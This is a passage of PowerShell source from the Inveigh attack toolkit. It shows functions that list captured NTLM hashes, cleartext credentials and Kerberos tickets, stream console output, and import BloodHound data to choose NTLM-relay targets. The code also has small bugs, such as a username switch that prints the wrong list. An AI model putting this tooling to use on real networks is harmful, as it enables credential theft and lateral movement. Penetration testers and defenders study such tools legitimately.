                        Write-Output $inveigh.console_queue[0]
                        $inveigh.console_queue.RemoveAt(0)
                    }

                }

            }
            
        }

    }

    if($ADIDNS)
    {
        $ADIDNS_table_keys_temp = $inveigh.ADIDNS_table.Keys

        foreach($ADIDNS_host in $ADIDNS_table_keys_temp)
        {
            
            if($inveigh.ADIDNS_table.$ADIDNS_host -ge 1)
            {
                Write-Output $ADIDNS_host
            }

        }

    }

    if($ADIDNSFailed)
    {

        $ADIDNS_table_keys_temp = $inveigh.ADIDNS_table.Keys

        foreach($ADIDNS_host in $ADIDNS_table_keys_temp)
        {
            
            if($inveigh.ADIDNS_table.$ADIDNS_host -eq 0)
            {
                Write-Output $ADIDNS_host
            }

        }

    }

    if($KerberosTGT)
    {
        Write-Output $inveigh.kerberos_TGT_list[$KerberosTGT]
    }

    if($KerberosUsername)
    {
        Write-Output $inveigh.kerberos_TGT_username_list
    }

    if($Log)
    {
        Write-Output $inveigh.log
    }

    if($NTLMv1)
    {
        Write-Output $inveigh.NTLMv1_list
    }

    if($NTLMv1Unique)
    {
        $inveigh.NTLMv1_list.Sort()
        $NTLMv1_list_temp = $inveigh.NTLMv1_list

        foreach($unique_NTLMv1 in $NTLMv1_list_temp)
        {
            $unique_NTLMv1_account = $unique_NTLMv1.SubString(0,$unique_NTLMv1.IndexOf(":",($unique_NTLMv1.IndexOf(":") + 2)))

            if($unique_NTLMv1_account -ne $unique_NTLMv1_account_last)
            {
                Write-Output $unique_NTLMv1
            }

            $unique_NTLMv1_account_last = $unique_NTLMv1_account
        }

    }

    if($NTLMv1Usernames)
    {
        Write-Output $inveigh.NTLMv2_username_list
    }

    if($NTLMv2)
    {
        Write-Output $inveigh.NTLMv2_list
    }

    if($NTLMv2Unique)
    {
        $inveigh.NTLMv2_list.Sort()
        $NTLMv2_list_temp = $inveigh.NTLMv2_list

        foreach($unique_NTLMv2 in $NTLMv2_list_temp)
        {
            $unique_NTLMv2_account = $unique_NTLMv2.SubString(0,$unique_NTLMv2.IndexOf(":",($unique_NTLMv2.IndexOf(":") + 2)))

            if($unique_NTLMv2_account -ne $unique_NTLMv2_account_last)
            {
                Write-Output $unique_NTLMv2
            }

            $unique_NTLMv2_account_last = $unique_NTLMv2_account
        }

    }

    if($NTLMv2Usernames)
    {
        Write-Output $inveigh.NTLMv2_username_list
    }

    if($Cleartext)
    {
        Write-Output $inveigh.cleartext_list
    }

    if($CleartextUnique)
    {
        Write-Output $inveigh.cleartext_list | Get-Unique
    }

    if($POSTRequest)
    {
        Write-Output $inveigh.POST_request_list
    }

    if($POSTRequestUnique)
    {
        Write-Output $inveigh.POST_request_list | Get-Unique
    }

    if($Learning)
    {
        Write-Output $inveigh.valid_host_list
    }

    if($Session)
    {
        $i = 0

        while($i -lt $inveigh.session_socket_table.Count)
        {

            if(!$inveigh.session_socket_table[$i].Connected)
            {
                $inveigh.session[$i] | Where-Object {$_.Status = "disconnected"}
            }
        
            $i++
        }

        Write-Output $inveigh.session | Format-Table -AutoSize
    }

    if($Enumerate)
    {
        Write-Output $inveigh.enumerate
    }

}

function Watch-Inveigh
{
<#
.SYNOPSIS
Watch-Inveigh will enabled real time console output. If using this function through a shell, test to ensure that it doesn't hang the shell.

.PARAMETER ConsoleOutput
(Medium,Low) Medium and Low can be used to reduce output.
#>

[CmdletBinding()]
param
( 
    [parameter(Mandatory=$false)][Switch]$NoConsoleMessage,
    [parameter(Mandatory=$false)][ValidateSet("Low","Medium","Y")][String]$ConsoleOutput = "Y",
    [parameter(ValueFromRemainingArguments=$true)]$invalid_parameter
)

if($inveigh.tool -ne 1)
{

    if($inveigh.running -or $inveigh.relay_running)
    {
        
        if(!$NoConsoleMessage)
        {
            Write-Output "[*] Press any key to stop console output"
        }

        $inveigh.console_output = $true

        :console_loop while((($inveigh.running -or $inveigh.relay_running) -and $inveigh.console_output) -or ($inveigh.console_queue.Count -gt 0 -and $inveigh.console_output))
        {

            while($inveigh.console_queue.Count -gt 0)
            {

                switch -wildcard ($inveigh.console_queue[0])
                {

                    {$_ -like "?`[`!`]*" -or $_ -like "?`[-`]*"}
                    {
                        Write-Warning $inveigh.console_queue[0]
                        $inveigh.console_queue.RemoveAt(0)
                    }

                    {$_ -like "*spoofer disabled]" -or $_ -like "*local request]" -or $_ -like "* host header *" -or $_ -like "* user agent received *"}
                    {

                        if($ConsoleOutput -eq 'Y')
                        {
                            Write-Output $inveigh.console_queue[0]
                        }

                        $inveigh.console_queue.RemoveAt(0)

                    } 

                    {$_ -like "*response sent]" -or $_ -like "*ignoring*" -or $_ -like "* HTTP*request for *" -or $_ -like "* Proxy*request for *" -or $_ -like "*SYN packet*"}
                    {
                    
                        if($ConsoleOutput -ne "Low")
                        {
                            Write-Output $inveigh.console_queue[0]
                        }

                        $inveigh.console_queue.RemoveAt(0)

                    } 

                    default
                    {
                        Write-Output $inveigh.console_queue[0]
                        $inveigh.console_queue.RemoveAt(0)
                    }

                } 

            }

            if([Console]::KeyAvailable)
            {
                $inveigh.console_output = $false
                BREAK console_loop
            }

            Start-Sleep -m 5
        }

    }
    else
    {
        Write-Output "[-] Inveigh isn't running"
    }

}
else
{
    Write-Output "[-] Watch-Inveigh cannot be used with current external tool selection"
}

}

function Clear-Inveigh
{
<#
.SYNOPSIS
Clear-Inveigh will clear Inveigh data from memory.
#>

if($inveigh)
{

    if(!$inveigh.running -and !$inveigh.relay_running)
    {
        Remove-Variable inveigh -scope global
        Write-Output "[+] Inveigh data has been cleared from memory"
    }
    else
    {
        Write-Output "[-] Run Stop-Inveigh before running Clear-Inveigh"
    }

}

}

function ConvertTo-Inveigh
{
    <#
    .SYNOPSIS
    ConvertTo-Inveigh imports Bloodhound computers, groups and session JSON files into $inveigh.enumerate
    for Inveigh Relay targeting.

    .DESCRIPTION
    For the fastest import, import the data before gather any enumeration data with Inveigh.

    .PARAMETER BloodHoundComputersJSON
    BloodHound computers file.

    .PARAMETER BloodHoundSessionsJSON
    BloodHound sessions file.

    .PARAMETER BloodHoundGroupsJSON
    BloodHound groups file.

    .PARAMTER DNS
    Enable DNS lookups
    #>

    [CmdletBinding()]
    param
    ( 
        [parameter(Mandatory=$false)][ValidateScript({Test-Path $_})][String]$Computers,
        [parameter(Mandatory=$false)][ValidateScript({Test-Path $_})][String]$Sessions,
        [parameter(Mandatory=$false)][ValidateScript({Test-Path $_})][String]$Groups,
        [parameter(Mandatory=$false)][Switch]$DNS,
        [parameter(ValueFromRemainingArguments=$true)]$invalid_parameter
    )

    if(!$Computers -and !$Sessions -and !$Groups)
    {
        Write-Output "Specifiy a BloodHound computers, groups, or sessions JSON file"
        throw
    }

    if($inveigh.running -or $inveigh.relay_running)
    {
        Write-Output "Run Stop-Inveigh before importing data with ConvertTo-Inveigh"
        throw
    }

    if(!$inveigh)
    {
        $global:inveigh = [HashTable]::Synchronized(@{})
        $inveigh.cleartext_list = New-Object System.Collections.ArrayList
        $inveigh.enumerate = New-Object System.Collections.ArrayList
        $inveigh.IP_capture_list = New-Object System.Collections.ArrayList
        $inveigh.log = New-Object System.Collections.ArrayList
        $inveigh.kerberos_TGT_list = New-Object System.Collections.ArrayList
        $inveigh.kerberos_TGT_username_list = New-Object System.Collections.ArrayList
        $inveigh.NTLMv1_list = New-Object System.Collections.ArrayList
        $inveigh.NTLMv1_username_list = New-Object System.Collections.ArrayList
        $inveigh.NTLMv2_list = New-Object System.Collections.ArrayList
        $inveigh.NTLMv2_username_list = New-Object System.Collections.ArrayList
        $inveigh.POST_request_list = New-Object System.Collections.ArrayList
        $inveigh.valid_host_list = New-Object System.Collections.ArrayList
        $inveigh.ADIDNS_table = [HashTable]::Synchronized(@{})
        $inveigh.relay_privilege_table = [HashTable]::Synchronized(@{})
        $inveigh.relay_failed_login_table = [HashTable]::Synchronized(@{})
        $inveigh.relay_history_table = [HashTable]::Synchronized(@{})
        $inveigh.request_table = [HashTable]::Synchronized(@{})
        $inveigh.session_socket_table = [HashTable]::Synchronized(@{})
        $inveigh.session_table = [HashTable]::Synchronized(@{})
        $inveigh.session_message_ID_table = [HashTable]::Synchronized(@{})
        $inveigh.session_lock_table = [HashTable]::Synchronized(@{})
        $inveigh.SMB_session_table = [HashTable]::Synchronized(@{})
        $inveigh.domain_mapping_table = [HashTable]::Synchronized(@{})
        $inveigh.group_table = [HashTable]::Synchronized(@{})
        $inveigh.session_count = 0
        $inveigh.session = @()
    }

    function New-RelayEnumObject
    {
        param ($IP,$Hostname,$DNSDomain,$netBIOSDomain,$Sessions,$AdministratorUsers,$AdministratorGroups,
            $Privileged,$Shares,$NetSessions,$NetSessionsMapped,$LocalUsers,$SMB2,$Signing,$SMBServer,$DNSRecord,
            $IPv6Only,$Targeted,$Enumerate,$Execute)

        if($Sessions -and $Sessions -isnot [Array]){$Sessions = @($Sessions)}
        if($AdministratorUsers -and $AdministratorUsers -isnot [Array]){$AdministratorUsers = @($AdministratorUsers)}
        if($AdministratorGroups -and $AdministratorGroups -isnot [Array]){$AdministratorGroups = @($AdministratorGroups)}
        if($Privileged -and $Privileged -isnot [Array]){$Privileged = @($Privileged)}
        if($Shares -and $Shares -isnot [Array]){$Shares = @($Shares)}
        if($NetSessions -and $NetSessions -isnot [Array]){$NetSessions = @($NetSessions)}
        if($NetSessionsMapped -and $NetSessionsMapped -isnot [Array]){$NetSessionsMapped = @($NetSessionsMapped)}
        if($LocalUsers -and $LocalUsers -isnot [Array]){$LocalUsers = @($LocalUsers)}

        $relay_object = New-Object PSObject
        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "Index" $inveigh.enumerate.Count
        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "IP" $IP
        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "Hostname" $Hostname
        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "DNS Domain" $DNSDomain
        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "netBIOS Domain" $netBIOSDomain
        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "Sessions" $Sessions
        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "Administrator Users" $AdministratorUsers
        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "Administrator Groups" $AdministratorGroups
        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "Privileged" $Privileged
        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "Shares" $Shares
        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "NetSessions" $NetSessions
        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "NetSessions Mapped" $NetSessionsMapped
        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "Local Users" $LocalUsers
        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "SMB2.1" $SMB2
        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "Signing" $Signing
        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "SMB Server" $SMBServer
        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "DNS Record" $DNSRecord
        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "IPv6 Only" $IPv6Only
        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "Targeted" $Targeted
        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "Enumerate" $Enumerate
        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "Execute" $Execute
        
        return $relay_object
    }

    function Get-DNSEntry([String]$hostname)
    {

        try
        {
            $IP_list = [System.Net.Dns]::GetHostEntry($hostname)

            foreach($entry in $IP_list.AddressList)
            {

                if(!$entry.IsIPv6LinkLocal)
                {
                    $IP = $entry.IPAddressToString
                }

            }
                    
        }
        catch
        {
            $IP = $null
        }

        return $IP
    }

    # JSON parsing from http://wahlnetwork.com/2016/03/15/deserializing-large-json-payloads-powershell-objects/ 
    function Invoke-ParseItem($JSONItem) 
    {

        if($JSONItem.PSObject.TypeNames -match 'Array') 
        {
            return Invoke-ParseJsonArray($JSONItem)
        }
        elseif($JSONItem.PSObject.TypeNames -match 'Dictionary') 
        {
            return Invoke-ParseJsonObject([HashTable]$JSONItem)
        }
        else 
        {
            return $JSONItem
        }

    }

    function Invoke-ParseJsonObject($JSONObject) 
    {
        $result = New-Object -TypeName PSCustomObject

        foreach($key in $JSONObject.Keys) 
        {
            $item = $JSONObject[$key]

            if ($item) 
            {
                $parsed_item = Invoke-ParseItem $item
            }
            else 
            {
                $parsed_item = $null
            }

            $result | Add-Member -MemberType NoteProperty -Name $key -Value $parsed_item
        }

        return $result
    }

    function Invoke-ParseJSONArray($JSONArray) 
    {
        $result = @()
        $stopwatch_progress = [System.Diagnostics.Stopwatch]::StartNew()
        $i = 0

        $JSONArray | ForEach-Object -Process {

            if($stopwatch_progress.Elapsed.TotalMilliseconds -ge 500)
            {
                $percent_complete_calculation = [Math]::Truncate($i / $JSONArray.count * 100)

                if($percent_complete_calculation -le 100)
                {
                    Write-Progress -Activity "Parsing JSON" -Status "$percent_complete_calculation% Complete:" -PercentComplete $percent_complete_calculation -ErrorAction SilentlyContinue
                }

                $stopwatch_progress.Reset()
                $stopwatch_progress.Start()
            }

            $i++
            $result += , (Invoke-ParseItem $_)}

        return $result
    }

    function Invoke-ParseJSONString($json) 
    {
        $config = $javaScriptSerializer.DeserializeObject($json)

        return Invoke-ParseJsonObject $config
    }

    [void][System.Reflection.Assembly]::LoadWithPartialName("System.Web.Extensions")

    if($inveigh.enumerate.Count -eq 0)
    {
        $enumerate_empty = $true
    }

    if($Computers)
    {       
        $Computers = (Resolve-Path $Computers).Path
        $computers_serializer = New-Object -TypeName System.Web.Script.Serialization.JavaScriptSerializer
        $computers_serializer.MaxJsonLength = 104857600
        $bloodhound_computers = [System.IO.File]::ReadAllText($Computers)
        $bloodhound_computers = $computers_serializer.DeserializeObject($bloodhound_computers)
        Write-Output "[*] Parsing BloodHound Computers JSON"
        $stopwatch_parse = [System.Diagnostics.Stopwatch]::StartNew()
        $bloodhound_computers = Invoke-ParseItem $bloodhound_computers
        Write-Output "[+] Parsing completed in $([Math]::Truncate($stopwatch_parse.Elapsed.TotalSeconds)) seconds"
        $stopwatch_parse.Reset()
        $stopwatch_parse.Start()
        Write-Output "[*] Importing computers to Inveigh"
        $stopwatch_progress = [System.Diagnostics.Stopwatch]::StartNew()
        $i = 0

        if(!$bloodhound_computers.Computers)
        {
            Write-Output "[!] JSON computers parse failed"
            throw
        }

        $bloodhound_computers.Computers | ForEach-Object {

            if($stopwatch_progress.Elapsed.TotalMilliseconds -ge 500)
            {
                $percent_complete_calculation = [Math]::Truncate($i / $bloodhound_computers.Computers.Count * 100)

                if($percent_complete_calculation -le 100)
                {
                    Write-Progress -Activity "[*] Importing computers" -Status "$percent_complete_calculation% Complete:" -PercentComplete $percent_complete_calculation -ErrorAction SilentlyContinue
                }

                $stopwatch_progress.Reset()
                $stopwatch_progress.Start()
            }

            $hostname = $_.Name
            [Array]$local_admin_users = $_.LocalAdmins | Where-Object {$_.Type -eq 'User'} | Select-Object -expand Name
            [Array]$local_admin_groups = $_.LocalAdmins | Where-Object {$_.Type -eq 'Group'} | Select-Object -expand Name

            if($DNS)
            {
                $IP = Get-DNSEntry $hostname

                if(!$IP)
                {
                    Write-Output "[-] DNS lookup for $Hostname failed"
                }

            }

            if(!$enumerate_empty)
            {

                for($i = 0;$i -lt $inveigh.enumerate.Count;$i++)
                {

                    if(($hostname -and $inveigh.enumerate[$i].Hostname -eq $hostname) -or ($IP -and $inveigh.enumerate[$i].IP -eq $IP))
                    {

                        if($inveigh.enumerate[$i].Hostname -ne $hostname -and $inveigh.enumerate[$i].IP -eq $IP)
                        {

                            for($j = 0;$j -lt $inveigh.enumerate.Count;$j++)
                            {

                                if($inveigh.enumerate[$j].IP -eq $target)
                                {
                                    $target_index = $j
                                    break
                                }

                            }

                            $inveigh.enumerate[$target_index].Hostname = $hostname
                        }
                        else
                        {

                            for($j = 0;$j -lt $inveigh.enumerate.Count;$j++)
                            {

                                if($inveigh.enumerate[$j].Hostname -eq $hostname)
                                {
                                    $target_index = $j
                                    break
                                }

                            }

                        }

                        $inveigh.enumerate[$target_index]."Administrator Users" = $local_admin_users
                        $inveigh.enumerate[$target_index]."Administrator Groups" = $local_admin_groups
                    }
                    else
                    {
                        $inveigh.enumerate.Add((New-RelayEnumObject -Hostname $_.Name -IP $IP -AdministratorUsers $local_admin_users -AdministratorGroups $local_admin_groups)) > $null
                    }

                }

            }
            else
            {
                $inveigh.enumerate.Add((New-RelayEnumObject -Hostname $_.Name -IP $IP -AdministratorUsers $local_admin_users -AdministratorGroups $local_admin_groups)) > $null
            }

            $IP = $null
            $hostname = $null
            $local_admin_users = $null
            $local_admin_groups = $null
            $target_index = $null
            $i++
        }

        Write-Output "[+] Import completed in $([Math]::Truncate($stopwatch_parse.Elapsed.TotalSeconds)) seconds"
        $stopwatch_parse.Reset()
        Remove-Variable bloodhound_computers
    }

    if($Sessions)
    {
        $Sessions = (Resolve-Path $Sessions).Path
        $sessions_serializer = New-Object -TypeName System.Web.Script.Serialization.JavaScriptSerializer
        $sessions_serializer.MaxJsonLength = 104857600
        $bloodhound_sessions = [System.IO.File]::ReadAllText($Sessions)
        $bloodhound_sessions = $sessions_serializer.DeserializeObject($bloodhound_sessions)
        $stopwatch_parse = [System.Diagnostics.Stopwatch]::StartNew()
        Write-Output "[*] Parsing BloodHound Sessions JSON"
        $bloodhound_sessions = Invoke-ParseItem $bloodhound_sessions
        Write-Output "[+] Parsing completed in $([Math]::Truncate($stopwatch_parse.Elapsed.TotalSeconds)) seconds"
        $stopwatch_parse.Reset()
        $stopwatch_parse.Start()
        Write-Output "[*] Importing sessions to Inveigh"
        $stopwatch_progress = [System.Diagnostics.Stopwatch]::StartNew()
        $i = 0

        if(!$bloodhound_sessions.Sessions)
        {
            Write-Output "[!] JSON sessions parse failed"
            throw
        }

        $bloodhound_sessions.Sessions | ForEach-Object {
            
            if($stopwatch_progress.Elapsed.TotalMilliseconds -ge 500)
            {
                $percent_complete_calculation = [Math]::Truncate($i / $bloodhound_sessions.Sessions.Count * 100)

                if($percent_complete_calculation -le 100)
                {
                    Write-Progress -Activity "[*] Importing sessions" -Status "$percent_complete_calculation% Complete:" -PercentComplete $percent_complete_calculation -ErrorAction SilentlyContinue
                }

                $stopwatch_progress.Reset()
                $stopwatch_progress.Start()
            }

            $hostname = $_.ComputerName

            if($hostname -as [IPAddress] -as [Bool])
            {
                $IP = $hostname
                $hostname = $null

                for($i = 0;$i -lt $inveigh.enumerate.Count;$i++)
                {

                    if($inveigh.enumerate[$i].IP -eq $target)
                    {
                        $target_index = $i
                        break
                    }

                }

            }
            else
            {
                for($i = 0;$i -lt $inveigh.enumerate.Count;$i++)
                {

                    if($inveigh.enumerate[$i].Hostname -eq $hostname)
                    {
                        $target_index = $i
                        break
                    }

                }

                if($DNS)
                {
                    $IP = Get-DNSEntry $hostname

                    if(!$IP)
                    {
                        Write-Output "[-] DNS lookup for $Hostname failed or IPv6 address"
                    }

                }

            }

            if(!$enumerate_empty -or $target_index -ge 0)
            {
                [Array]$session_list = $inveigh.enumerate[$target_index].Sessions

                if($session_list -notcontains $_.UserName)
                {
                    $session_list += $_.UserName
                    $inveigh.enumerate[$target_index].Sessions = $session_list
                }

            }
            else
            {   
                $inveigh.enumerate.Add($(New-RelayEnumObject -Hostname $hostname -IP $IP -Sessions $_.UserName)) > $null
            }

            $hostname = $null
            $IP = $null
            $session_list = $null
            $target_index = $null
            $i++
        }

        Write-Output "[+] Import completed in $([Math]::Truncate($stopwatch_parse.Elapsed.TotalSeconds)) seconds"
        $stopwatch_parse.Reset()
        Remove-Variable bloodhound_sessions
    }
    
    if($Groups)
    {
        $Groups = (Resolve-Path $Groups).Path
        $groups_serializer = New-Object -TypeName System.Web.Script.Serialization.JavaScriptSerializer
        $groups_serializer.MaxJsonLength = 104857600
        $bloodhound_groups = [System.IO.File]::ReadAllText($Groups)
        $bloodhound_groups = $groups_serializer.DeserializeObject($bloodhound_groups)
        $stopwatch_parse = [System.Diagnostics.Stopwatch]::StartNew()
        Write-Output "[*] Parsing BloodHound Groups JSON"
        $bloodhound_groups = Invoke-ParseItem $bloodhound_groups
        Write-Output "[+] Parsing completed in $([Math]::Truncate($stopwatch_parse.Elapsed.TotalSeconds)) seconds"
        $stopwatch_parse.Reset()
        $stopwatch_parse.Start()
        Write-Output "[*] Importing groups to Inveigh"
        $stopwatch_progress = [System.Diagnostics.Stopwatch]::StartNew()
        $i = 0

        if(!$bloodhound_groups.Groups)
        {
            Write-Output "[!] JSON groups parse failed"
            throw
        }
        
        $bloodhound_groups.Groups | ForEach-Object {

            if($stopwatch_progress.Elapsed.TotalMilliseconds -ge 500)
            {
                $percent_complete_calculation = [Math]::Truncate($i / $bloodhound_groups.Groups.Count * 100)

                if($percent_complete_calculation -le 100)
                {
                    Write-Progress -Activity "[*] Importing groups" -Status "$percent_complete_calculation% Complete:" -PercentComplete $percent_complete_calculation -ErrorAction SilentlyContinue
                }

                $stopwatch_progress.Reset()
                $stopwatch_progress.Start()
            }

            [Array]$group_members = $_.Members | Select-Object -expand MemberName
            $inveigh.group_table.Add($_.Name,$group_members)
            $group_members = $null
            $i++
        }

        Write-Output "[+] Import completed in $([Math]::Truncate($stopwatch.Elapsed.TotalSeconds)) seconds"
    }

}

#endregion